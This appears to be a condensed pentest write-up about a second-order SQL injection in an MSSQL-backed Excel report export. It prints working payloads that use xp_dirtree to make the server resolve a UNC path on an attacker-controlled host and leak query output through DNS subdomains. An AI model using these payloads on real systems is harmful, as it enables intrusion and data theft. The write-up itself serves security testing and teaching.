---
title: "Exploiting Second Order SQL Injection with Stored Procedures (DNS-based egress)"
author: Deepak Dhasmana (NetSPI)
url: https://www.netspi.com/blog/technical-blog/web-application-pentesting/second-order-sql-injection-with-stored-procedures-dns-based-egress/
date_published: 2024-12
date_scraped: 2026-11-19
platform: other
disclosed_report: none
bounty: not stated (pentest)
vuln_class: sqli
---

<!-- Raw scraped text below. Public writeup. Condensed from the full article (saved separately). MSSQL. -->

# Second-order MSSQL injection via OOB DNS egress (xp_dirtree)

A second-order, out-of-band SQL injection in a Microsoft Excel report-export feature (MSSQL backend). Second-order: a payload stored by one part of the app is later executed in a different context (a subsequent API call) without sanitization, so it does not trigger immediately, making it hard to detect.

## The flow (why it's second-order)
The export feature takes a date and generates an Excel report over a chain of requests:
1. `POST /api/report` with `ReportParams` JSON containing a `Value` (a date) and a report id is returned.
2. A later call consumes the stored `ReportParams` and builds the SQL query, where the injection fires.
```
POST /api/report
{"ReportTypeId":36,"ReportActionType":"Export",
 "ReportParams":"{\"76\":{\"Value\":\"2024-08-15T00:00:00.000Z\",\"DisplayValue\":\"...\"}}"}
```
The injectable field is `Value` inside the stored `ReportParams`.

## Confirming the DBMS (time-based)
A balanced payload with a `WAITFOR` delay caused a 500, then a 200 OK after ~20s on reissue. Since `WAITFOR` is MSSQL-specific, the backend is Microsoft SQL Server.

## Exploitation: OOB via xp_dirtree (single-step, no slow blind loop)
Inject into `Value` a query that makes the SQL server resolve a UNC path on an attacker-controlled host (forces outbound DNS):
```
"Value":"2024-08-22T00:00:00.000Z'; DECLARE @q VARCHAR(99); SET @q='\\collab.domain\path'; EXEC master.dbo.xp_dirtree @q;-- "
```
Breakdown: `';` closes the string/statement; `DECLARE @q`; `SET @q` to the UNC path `\\collab.domain\path`; `EXEC master.dbo.xp_dirtree @q` lists that network path, triggering a DNS lookup; `--` comments the tail. DNS hits on the collaborator (an Interactsh server automated the capture) confirmed the vuln.

## Exfiltration in the DNS subdomain
Put query output into the subdomain so it arrives in the DNS request:
```
-- database name
"Value":"...';DECLARE @q NVARCHAR(256); SELECT @q = DB_NAME(); DECLARE @cmd NVARCHAR(4000); SET @cmd = '\\' + @q + '.collab.domain\path'; EXEC master.dbo.xp_dirtree @cmd;-- "
-- server name: SELECT @q = @@SERVERNAME similarly
```
Iterating over tables/columns/users exfiltrates the schema and data (usernames, tables, service account) via DNS. Challenges noted: character limits and special-char handling in the injected payload.

## Lessons
- Second-order SQLi hides: input stored safely in one request fires in a later, different context. Inject into stored fields (report params, preferences), then find the endpoint that reuses them.
- OOB via `xp_dirtree` (UNC path -> DNS) turns a blind/async injection into a single-step exfiltration channel, avoiding slow time-based loops. DNS egress is usually permitted.
- `WAITFOR`/`xp_dirtree` being MSSQL-specific doubles as a DBMS fingerprint.
